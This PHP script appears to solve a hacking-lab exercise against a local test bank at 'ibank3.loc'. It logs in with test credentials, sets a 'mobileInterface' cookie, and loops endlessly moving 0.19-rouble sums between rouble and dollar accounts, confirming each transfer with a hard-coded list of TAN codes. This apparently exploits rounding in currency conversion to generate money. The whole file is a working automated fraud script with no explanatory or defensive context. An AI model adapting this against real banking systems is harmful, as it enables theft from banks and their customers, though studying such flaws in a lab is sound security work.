<?php

define('DOMAIN', 'ibank3.loc');

$login       = 'test';
$password    = 'qwerty';
$transferSum = 0.19;
$tanCodes    = array (
    1  => '33448',
    2  => '01508',
    3  => '81821',
    4  => '45205',
    5  => '48998',
    6  => '03110',
    7  => '44499',
    8  => '39090',
    9  => '97270',
    10 => '31552',
    11 => '10100',
    12 => '90311',
    13 => '46685',
    14 => '51550',
    15 => '65892',
    16 => '92448',
    17 => '75986',
    18 => '08639',
    19 => '88647',
    20 => '19975',
);
$cookie_file = '/tmp/ibank_cookie';

function login($ch, $login, $password)
{
    $postdata = http_build_query(
            array (
                'login'    => $login,
                'password' => $password,
            )
    );

    curl_setopt_array($ch, array (
        CURLOPT_URL            => DOMAIN . '/auth/login',
        CURLOPT_POST           => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_POSTFIELDS     => $postdata,
    ));

    return curl_exec($ch);
}

function fetchAccounts($ch)
{
    curl_setopt_array($ch, array (
        CURLOPT_URL  => DOMAIN . '/payments/create',
        CURLOPT_POST => 0,
    ));

    $page = curl_exec($ch);

    $regex = '/<option\s+value=\"(\d+)\">\s+([\d]+)\s+\(([\d\.]+)\&nbsp;(Rub|\$)\).*<\/option/msU';
    if (!preg_match_all($regex, $page, $matches)) {
        die("Can't fetch accounts\n");
    }

    $accounts = array ();

    for ($i = 0; $i < count($matches[0]); $i++) {
        $currency            = $matches[4][$i] == '$' ? 'usd' : 'rub';
        $accounts[$currency] = array (
            'id'     => $matches[1][$i],
            'number' => $matches[2][$i],
            'sum'    => $matches[3][$i],
        );
    }

    return $accounts;
}

function transfer($ch, $from, $to, $sum, $tans)
{
    $postdata = http_build_query(array (
        'from'        => $from,
        'to'          => $to,
        'sum'         => $sum,
        'description' => 'Convert'
    ));

    curl_setopt_array($ch, array (
        CURLOPT_URL            => DOMAIN . '/payments/create',
        CURLOPT_POST           => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_POSTFIELDS     => $postdata,
    ));

    $result = curl_exec($ch);

    if (preg_match("~/payments/delete/id/(\d+)~", $result, $match)) {
        $transaction_id = $match[1];
    } else {
        die("Can't get transaction id\n");
    }

    preg_match("/Password #(\d+)/", $result, $match);
    $tan = $tans[$match[1]];

    preg_match("/<input.*name=\"card_id\"\s+value=\"(\d+)\"/U", $result, $match);
    $cardId = $match[1];

    $postdata = http_build_query(array (
        'otp'     => $tan,
        'card_id' => $cardId,
    ));

    curl_setopt_array($ch, array (
        CURLOPT_URL        => DOMAIN . '/payments/confirmTan/id/' . $transaction_id,
        CURLOPT_POSTFIELDS => $postdata,
    ));

    $result = curl_exec($ch);

    if (strpos($result, "Wrong password") !== false) {
        die("Wrong TAN\n");
    }

    curl_setopt_array($ch, array (
        CURLOPT_URL            => DOMAIN . '/payments/process/id/' . $transaction_id,
        CURLOPT_FOLLOWLOCATION => 0,
        CURLOPT_POST           => 0,
    ));

    $result = curl_exec($ch);
}

@unlink($cookie_file);
file_put_contents($cookie_file, DOMAIN . "\tFALSE\t/\tFALSE\t0\tmobileInterface\ttrue", FILE_APPEND | LOCK_EX);

$ch = curl_init();

curl_setopt_array($ch, array (
    CURLOPT_HEADER         => 0,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_COOKIEJAR      => $cookie_file,
    CURLOPT_COOKIEFILE     => $cookie_file,
));

login($ch, $login, $password);


while (1) {
    $accounts = fetchAccounts($ch);
    echo "{$accounts['rub']['sum']} Rub\n";

    while ($accounts['rub']['sum'] > $transferSum) {
        transfer($ch, $accounts['rub']['id'], $accounts['usd']['number'], $transferSum, $tanCodes);
        $accounts['rub']['sum'] -= $transferSum;
    }

    $accounts = fetchAccounts($ch);
    echo "{$accounts['usd']['sum']} $\n";

    if ($accounts['usd']['sum'] > 0) {
        transfer($ch, $accounts['usd']['id'], $accounts['rub']['number'], $accounts['usd']['sum'], $tanCodes);
    } else {
        die("USD balance <= 0\n");
    }
}